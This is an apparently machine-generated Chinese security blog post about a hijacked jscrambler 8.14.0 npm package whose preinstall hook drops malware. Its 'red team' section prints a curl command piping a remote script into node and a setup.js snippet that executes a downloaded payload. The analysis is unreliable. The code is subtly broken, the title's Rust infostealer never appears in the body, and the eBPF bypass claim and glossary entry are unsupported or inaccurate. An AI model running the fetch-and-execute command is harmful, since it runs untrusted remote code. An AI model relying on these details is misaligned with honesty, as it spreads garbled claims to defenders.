---
layout: post
title:  "Compromised jscrambler 8.14.0 npm Release Drops Rust Infostealer During Install"
date:   2026-07-11 18:50:41 +0000
categories: [security]
severity: critical
---

# 🚨 解析 jscrambler npm 套件劫持事件：技術分析與防禦策略
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: Info Leak 和 RCE (遠程命令執行)
> * **關鍵技術**: `npm` 套件劫持、`preinstall` hook、`eBPF` 程式碼注入

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: jscrambler npm 套件的 `preinstall` hook 被劫持，導致安裝過程中執行惡意程式碼。
* **攻擊流程圖解**:
  1. 使用者安裝 jscrambler 套件（版本 8.14.0）。
  2. `preinstall` hook 被觸發，執行 `setup.js` 腳本。
  3. `setup.js` 下載並執行惡意程式碼（`intro.js`）。
  4. 惡意程式碼執行，竊取敏感資訊並傳送到遠端伺服器。
* **受影響元件**: jscrambler 套件版本 8.14.0。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 使用者需要安裝 jscrambler 套件（版本 8.14.0）。
* **Payload 建構邏輯**:

    ```
    
    javascript
      // setup.js
      const fs = require('fs');
      const childProcess = require('child_process');
    
      // 下載並執行惡意程式碼
      const payload = fs.readFileSync('intro.js');
      childProcess.exec(payload);
    
    ```
 

```

bash
  # 範例指令
  curl -s https://example.com/intro.js | node

```
* **繞過技術**: 使用 `eBPF` 程式碼注入技術，繞過系統安全機制。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| Hash | a742de963f14a92d24ebcbc7b44ac867e23a20d31d1b0094a13a4f83287f4e60 |
| IP | 37.27.122.124, 57.128.246.79 |
| Domain | check.torproject.org, archive.torproject.org |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule jscrambler_malware {
        meta:
          description = "Detect jscrambler malware"
          author = "Your Name"
        strings:
          $setup_js = "setup.js"
          $intro_js = "intro.js"
        condition:
          $setup_js and $intro_js
      }
    
    ```
 

```

snort
  alert tcp any any -> any 80 (msg:"jscrambler malware detected"; content:"setup.js"; content:"intro.js";)

```
* **緩解措施**:
  1. 更新 jscrambler 套件至版本 8.15.0 或更高。
  2. 刪除 `node_modules` 目錄並重新安裝套件。
  3. 監控系統日誌並檢查是否有可疑活動。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **npm (Node Package Manager)**: Node.js 的套件管理工具。
* **preinstall hook**: npm 套件安裝前執行的腳本。
* **eBPF (Extended Berkeley Packet Filter)**: 一種 Linux 核心技術，允許用戶空間程式碼注入到核心空間。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/07/compromised-jscrambler-8140-npm-release.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


